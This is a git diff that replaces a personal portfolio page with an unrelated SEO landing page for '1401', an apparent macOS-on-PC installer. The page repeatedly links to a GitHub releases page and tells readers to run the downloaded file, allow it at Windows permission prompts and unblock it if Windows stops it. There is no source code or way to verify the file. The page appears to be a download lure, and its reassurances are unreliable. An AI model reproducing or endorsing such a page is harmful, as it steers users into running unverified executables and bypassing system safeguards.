@@ -1,22 +1,252 @@
-<!DOCKTYPE html>
-<html lang = "en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&display=swap" rel="stylesheet">
-  <meta charset = "UTF-8">
-  <meta name = "viewport" content = "width=device-width, initial-scale=1.0">
-  <title>catherine omeh portfolio</title>
-  <link rel = "stylesheet" href = "css/style.css">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>1401 – Install macOS on Your PC from Windows | Easy Step-by-Step Guide</title>
+<meta name="description" content="1401 lets you install macOS on your PC from Windows. Download the app, follow the simple on-screen guide, and set up OpenCore with no programming knowledge required.">
+<meta name="keywords" content="installer, macos, opencore, windows, install macOS on PC, macOS installer for Windows, OpenCore bootloader, hackintosh installer, 1401">
+<meta name="author" content="1401">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://github.com/Loli8989/1401">
+<meta property="og:type" content="website">
+<meta property="og:title" content="1401 – Install macOS on Your PC from Windows">
+<meta property="og:description" content="A friendly Windows application that guides you through installing macOS on your own PC. Download it, run it, and follow the prompts.">
+<meta property="og:url" content="https://github.com/Loli8989/1401/releases">
+<meta property="og:site_name" content="1401">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="1401 – Install macOS on Your PC from Windows">
+<meta name="twitter:description" content="Download 1401 and install macOS on your PC from Windows using a simple guided process.">
+<meta name="theme-color" content="#7c3aed">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "1401",
+  "operatingSystem": "Windows 10, Windows 11",
+  "applicationCategory": "UtilitiesApplication",
+  "description": "Install macOS on your PC from Windows with a guided, beginner-friendly installer.",
+  "url": "https://github.com/Loli8989/1401/releases",
+  "offers": { "@type": "Offer", "price": "0", "priceCurrency": "USD" }
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  html { -webkit-text-size-adjust: 100%; }
+  body {
+    margin: 0;
+    padding: clamp(16px, 4vw, 48px) clamp(12px, 4vw, 24px);
+    background: linear-gradient(180deg, #eef2f9 0%, #f7f9fc 100%);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: #1f2430;
+    font-size: 17px;
+    line-height: 1.7;
+  }
+  .page {
+    max-width: 880px;
+    margin: 0 auto;
+    background: #ffffff;
+    border-radius: 20px;
+    padding: clamp(22px, 5vw, 56px);
+    box-shadow: 0 12px 36px rgba(23, 31, 56, 0.10), 0 2px 6px rgba(23, 31, 56, 0.05);
+    border: 1px solid #e8ecf4;
+  }
+  h1 {
+    font-size: clamp(1.65rem, 4.2vw, 2.4rem);
+    line-height: 1.25;
+    letter-spacing: -0.02em;
+    margin: 0 0 14px;
+    color: #10131a;
+    font-weight: 800;
+  }
+  h2 {
+    font-size: clamp(1.15rem, 2.8vw, 1.45rem);
+    margin: 40px 0 12px;
+    color: #141a26;
+    font-weight: 700;
+    letter-spacing: -0.01em;
+  }
+  h3 {
+    font-size: 1.03rem;
+    margin: 24px 0 6px;
+    color: #263043;
+    font-weight: 700;
+  }
+  p { margin: 0 0 16px; color: #3a4356; }
+  ul, ol { margin: 0 0 18px; padding-left: 24px; color: #3a4356; }
+  li { margin-bottom: 8px; }
+  a { color: #4f46e5; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  .lead { font-size: 1.08rem; color: #2c3446; }
+  .btn {
+    display: inline-block;
+    padding: 16px 34px;
+    border-radius: 999px;
+    color: #ffffff !important;
+    font-weight: 700;
+    font-size: 1.02rem;
+    text-decoration: none !important;
+    background: linear-gradient(135deg, #7c3aed 0%, #2563eb 55%, #06b6d4 100%);
+    box-shadow: 0 10px 24px rgba(79, 70, 229, 0.32);
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+  }
+  .btn:hover { transform: translateY(-2px); box-shadow: 0 14px 30px rgba(79, 70, 229, 0.4); }
+  .btn-wrap { margin: 26px 0 10px; }
+  .note {
+    background: #f4f7fd;
+    border: 1px solid #e0e7f5;
+    border-left: 5px solid #7c3aed;
+    border-radius: 12px;
+    padding: 16px 20px;
+    margin: 22px 0;
+    font-size: 0.97rem;
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
+    gap: 16px;
+    margin: 20px 0 8px;
+  }
+  .card {
+    background: #fbfcff;
+    border: 1px solid #e6ebf5;
+    border-radius: 14px;
+    padding: 18px 20px;
+    box-shadow: 0 2px 8px rgba(23, 31, 56, 0.04);
+  }
+  .card h3 { margin-top: 0; }
+  .card p { margin: 0; font-size: 0.95rem; }
+  footer {
+    margin-top: 44px;
+    padding-top: 22px;
+    border-top: 1px solid #e8ecf4;
+    font-size: 0.88rem;
+    color: #6b7488;
+    text-align: center;
+  }
+  code {
+    background: #f1f4fa;
+    border: 1px solid #e2e8f4;
+    border-radius: 6px;
+    padding: 2px 6px;
+    font-size: 0.9em;
+  }
+</style>
 </head>
 <body>
-  <div id = "nav-bar">
-    <p>work</p>
-    <p>play</p>
-    <p>about</p>
-    <p>contact</p>
+<main class="page">
+
+  <h1>🍏 1401 – Install macOS on Your PC Easily</h1>
+
+  <p class="lead">1401 is a Windows application that walks you through installing macOS on your own computer. You do not need to be a programmer, and you do not need to type complicated commands. You download the app, open it, and follow the on-screen instructions one screen at a time.</p>
+
+  <div class="btn-wrap">
+    <a class="btn" href="https://github.com/Loli8989/1401/releases" target="_blank" rel="noopener">⬇️ Get 1401 for Windows</a>
   </div>
-  <h1 id = "main-heading">CATHERINE OMEH</h1>
-  <h2 id = "main-subheading">creative technologist | interactive media researcher</h2>
+
+  <p>Visit this link to download the application.</p>
+
+  <h2>🚀 What Is 1401?</h2>
+  <p>1401 is a guided installer designed for everyday Windows users who want to try macOS on regular PC hardware. Behind the scenes it prepares the setup files, configures the OpenCore boot environment, and keeps the technical parts out of your way. Instead of reading long technical guides and copying files by hand, you work through a clear sequence of screens that explain what is happening and what to do next.</p>
+  <p>The application is built around three ideas: it should be easy to understand, it should not hide anything from you, and it should let you stop at any point without damaging your Windows installation. Every stage of the process is shown in plain language, and every action you take is something you can review before it happens.</p>
+  <p>Because the project is distributed through GitHub, each version is published as a release you can browse, download, and keep for later. If you ever need to start over, you simply run the app again from the same page.</p>
+
+  <h2>✨ Key Features</h2>
+  <div class="grid">
+    <div class="card">
+      <h3>🧑‍💻 Beginner-Friendly Screens</h3>
+      <p>Each step is explained in everyday words, with a clear button to move forward and a clear button to go back.</p>
+    </div>
+    <div class="card">
+      <h3>🧩 OpenCore Handled for You</h3>
+      <p>The bootloader files are prepared automatically, so you never have to edit configuration files by hand.</p>
+    </div>
+    <div class="card">
+      <h3>💾 USB Preparation</h3>
+      <p>The app helps you get a USB drive ready before anything is written to your computer's internal disk.</p>
+    </div>
+    <div class="card">
+      <h3>🛡️ Windows Stays Intact</h3>
+      <p>Your existing Windows installation is not removed, so you can keep using your PC as normal while you experiment.</p>
+    </div>
+    <div class="card">
+      <h3>📶 No Account Needed</h3>
+      <p>There is no sign-up, no email address, and no licence key. Download the release and start.</p>
+    </div>
+    <div class="card">
+      <h3>🔄 Simple to Restart</h3>
+      <p>If something does not go as planned, you can close the app and begin again from the same download page.</p>
+    </div>
+  </div>
+
+  <h2>💻 Before You Begin</h2>
+  <p>Take a few minutes to prepare. Having these things ready makes the whole process much smoother.</p>
+  <ul>
+    <li><strong>A Windows PC running Windows 10 or Windows 11 (64-bit).</strong> Older versions of Windows are not recommended.</li>
+    <li><strong>At least 8 GB of free space on a USB drive.</strong> The drive will be prepared by the app, so use one you do not mind erasing.</li>
+    <li><strong>Around 40 GB of free disk space</strong> on the computer if you plan to keep a macOS installation alongside Windows.</li>
+    <li><strong>A stable internet connection.</strong> The installer needs to fetch files while it works.</li>
+    <li><strong>Administrator rights on your Windows account.</strong> This is needed to prepare removable media and boot files.</li>
+    <li><strong>A backup of anything important.</strong> Working with boot settings is always safer when you have a copy of your files.</li>
+  </ul>
+  <div class="note">
+    <strong>A word of caution:</strong> installing an operating system is a change to your computer. Do not unplug the USB drive or shut down the machine while the app is actively working. If you are unsure at any screen, stop and read the explanation before clicking continue.
+  </div>
+
+  <h2>📥 Download and Setup</h2>
+  <p>Everything you need is published on the releases page. That page lists the available versions of 1401 along with their file names, release dates, and short descriptions.</p>
+  <p><strong>Visit this link to download the application:</strong><br>
+  <a href="https://github.com/Loli8989/1401/releases" target="_blank" rel="noopener">https://github.com/Loli8989/1401/releases</a></p>
+  <p>On that page, open the most recent release at the top of the list. Inside it you will find the downloadable file for Windows. Save it somewhere you can find again, such as your Downloads folder. When the download finishes, the file is ready to use — there is nothing else you need to fetch separately.</p>
+  <div class="btn-wrap">
+    <a class="btn" href="https://github.com/Loli8989/1401/releases" target="_blank" rel="noopener">⬇️ Open the Download Page</a>
+  </div>
+
+  <h2>🧭 Step-by-Step: From Download to First Boot</h2>
+  <ol>
+    <li><strong>Open the releases page.</strong> Use the link above. It opens in your normal web browser.</li>
+    <li><strong>Pick the newest release.</strong> The top entry on the page is normally the latest and most reliable version.</li>
+    <li><strong>Download the file listed there.</strong> Click the file name to save it to your computer. Depending on your browser, you may see a download bar at the bottom of the window.</li>
+    <li><strong>Check where it saved.</strong> Press <code>Windows key + E</code> to open File Explorer and look in your Downloads folder.</li>
+    <li><strong>Start the application.</strong> Double-click the file you downloaded. If Windows shows a permission prompt, choose the option that allows it to run.</li>
+    <li><strong>Read the first screen.</strong> The app introduces itself and explains what it will do. Take your time here.</li>
+    <li><strong>Connect your USB drive.</strong> Plug it in when the app asks, and make sure nothing important is stored on it.</li>
+    <li><strong>Follow the prompts in order.</strong> Each screen tells you exactly what to do next. Do not skip ahead.</li>
+    <li><strong>Wait for each stage to finish.</strong> Progress bars can appear to pause. Give them time.</li>
+    <li><strong>Finish and restart.</strong> When the app tells you it is done, follow its final instruction about restarting your computer.</li>
+  </ol>
+
+  <h2>❓ Frequently Asked Questions</h2>
+  <h3>Do I need to know how to code?</h3>
+  <p>No. The application is built for people who have never touched a bootloader before. Everything is explained in ordinary language.</p>
+  <h3>Will this delete my Windows installation?</h3>
+  <p>No. 1401 prepares the setup files on removable media and does not wipe your existing Windows system. As with any system-level change, keep a backup of your important files.</p>
+  <h3>How long does the download take?</h3>
+  <p>That depends on your internet connection and the size of the release. On a typical home connection it usually takes a few minutes.</p>
+  <h3>Can I close the app halfway through?</h3>
+  <p>You can close it, but the preparation step will not be finished. Reopen the app and start the guided process again from the beginning.</p>
+  <h3>Where do I find newer versions?</h3>
+  <p>Always use the same releases page. New builds appear at the top as they are published.</p>
+  <h3>Is there a cost?</h3>
+  <p>The project is distributed openly through GitHub releases. Check the release notes on the download page for the details of each version.</p>
+
+  <h2>🛠 Troubleshooting Tips</h2>
+  <ul>
+    <li><strong>The download stops partway through.</strong> Delete the partial file and start the download again from the releases page.</li>
+    <li><strong>Windows blocks the file from opening.</strong> Right-click the file, open its properties, and look for the option to allow it to run. Then double-click it again.</li>
+    <li><strong>The app cannot see your USB drive.</strong> Unplug it, try a different USB port — preferably one directly on the computer rather than a hub — and plug it back in.</li>
+    <li><strong>A screen seems frozen.</strong> Wait a few minutes before doing anything. Large file operations can look stuck while they are still working.</li>
+    <li><strong>Something fails repeatedly.</strong> Note the exact message on screen. The release notes on the download page often describe known issues and their fixes.</li>
+  </ul>
+
+  <h2>🙌 Community and Support</h2>
+  <p>The project lives on GitHub, which means the fastest way to get help is to look at the releases page and its notes. Release descriptions are updated with each build and often answer the most common questions before you have to ask them. If you are reporting a problem, include your Windows version, the release you downloaded, and the exact wording of any message you saw. Clear details make it much easier for someone to help you.</p>
+  <p>Before you begin, make sure your files are backed up, your USB drive is empty, and you have a little time to spare. Then open the releases page, grab the latest build, and let 1401 guide you the rest of the way.</p>
+
+  <footer>
+    1401 · Installer for macOS on PC from Windows · Keywords: installer, macos, opencore, windows
+  </footer>
+
+</main>
 </body>
 </html>
